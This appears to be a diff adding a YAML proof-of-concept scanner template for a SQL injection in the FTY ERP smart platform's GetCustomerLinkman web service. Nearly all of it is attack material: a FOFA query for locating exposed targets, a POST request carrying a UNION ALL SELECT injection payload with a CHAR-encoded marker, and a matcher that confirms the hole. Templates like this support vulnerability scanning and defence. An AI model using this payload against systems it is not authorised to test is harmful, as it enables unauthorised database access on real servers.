@@ -1,0 +1,19 @@
+id: poc-yaml-ftyerp-getcustomerlinkman-sqli
+info:
+  name: 方天云智慧平台系统 GetCustomerLinkman SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ftyerp
+  fofa: body="AjaxMethods.asmx/GetCompanyItem"
+requests:
+- method: POST
+  path: /WXAPI.asmx/GetCustomerLinkman
+  headers:
+    Content-Type: application/json
+  data: '{clmID:"1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(73)+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(122)+CHAR(113),NULL,NULL--
+    OSZH"}'
+  expression: "status_code == 200 && \ncontains(body,\"qxzjqIqjxzq\") &&\ncontains(body,\"\
+    \\\"clmWW\\\":\") &&\ncontains(content_type,\"application/json\")\n"
+variables: {}
+transport: http
